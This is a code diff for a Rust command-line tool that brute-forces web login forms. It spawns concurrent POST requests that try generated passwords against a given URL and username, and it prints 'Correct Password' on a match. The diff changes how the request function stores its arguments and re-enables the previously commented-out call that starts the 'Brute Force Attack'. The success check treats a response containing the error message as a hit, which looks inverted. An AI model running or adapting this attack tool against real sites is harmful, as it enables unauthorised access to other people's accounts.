@@ -18,38 +18,49 @@ fn password_generator() -> impl Iterator<Item = String> {
 }
 
 async fn sending_requests(
-    url: &'static str,
-    username: &'static str,
-    username_field: &'static str,
-    password_field: &'static str,
-    error_message: &'static str,
+    url: String,
+    username: String,
+    username_field: String,
+    password_field: String,
+    error_message: String,
 ) {
+    let url = std::sync::Arc::new(url);
+    let username = std::sync::Arc::new(username);
+    let username_field = std::sync::Arc::new(username_field);
+    let password_field = std::sync::Arc::new(password_field);
+    let error_message = std::sync::Arc::new(error_message);
     let mut request_amount = 0;
     let mut tasks: Vec<tokio::task::JoinHandle<Result<(), ()>>> = Vec::new();
 
     for password in password_generator() {
         request_amount += 1;
 
+        let url = url.clone();
+        let username = username.clone();
+        let username_field = username_field.clone();
+        let password = std::sync::Arc::new(password);
+        let password_field = password_field.clone();
+        let error_message = error_message.clone();
         tasks.push(tokio::spawn(async move {
             let fields = [
-                (username.clone(), username_field.clone()),
-                (password_field.clone(), &password),
+                (username, username_field),
+                (password_field, password.clone()),
             ];
 
             loop {
                 match reqwest::Client::new()
-                    .post(url.clone())
+                    .post(&*url)
                     .form(&fields)
                     .send()
                     .await
                 {
                     Ok(resp) => match resp.text().await {
                         Ok(text) => {
-                            if text.contains(&error_message.clone()) {
+                            if text.contains(&*error_message) {
                                 println!(
                                     "[{}] Correct Password: '{}'",
                                     Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
-                                    &password,
+                                    password,
                                 );
 
                                 println!(
@@ -130,28 +141,28 @@ async fn main() {
         )
         .get_matches();
 
-    let website_url: &'static str = matches.value_of("url").unwrap();
-    let username: &'static str = matches.value_of("username").unwrap();
-    let username_field: &'static str = matches.value_of("username_field").unwrap();
-    let password_field: &'static str = matches.value_of("password_field").unwrap();
-    let error_message: &'static str = matches.value_of("error_message").unwrap();
+    let website_url: &str = matches.value_of("url").unwrap();
+    let username: &str = matches.value_of("username").unwrap();
+    let username_field: &str = matches.value_of("username_field").unwrap();
+    let password_field: &str = matches.value_of("password_field").unwrap();
+    let error_message: &str = matches.value_of("error_message").unwrap();
 
     println!(
         "[{}] Starting Brute Force Attack",
         Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
     );
 
-    // println!(
-    //     "{} {} {} {} {}",
-    //     website_url, username, username_field, password_field, error_message
-    // );
+    println!(
+        "{} {} {} {} {}",
+        website_url, username, username_field, password_field, error_message
+    );
 
-    // sending_requests(
-    //     website_url.to_string(),
-    //     username.to_string(),
-    //     username_field.to_string(),
-    //     password_field.to_string(),
-    //     error_message.to_string(),
-    // )
-    // .await
+    sending_requests(
+        website_url.to_string(),
+        username.to_string(),
+        username_field.to_string(),
+        password_field.to_string(),
+        error_message.to_string(),
+    )
+    .await
 }
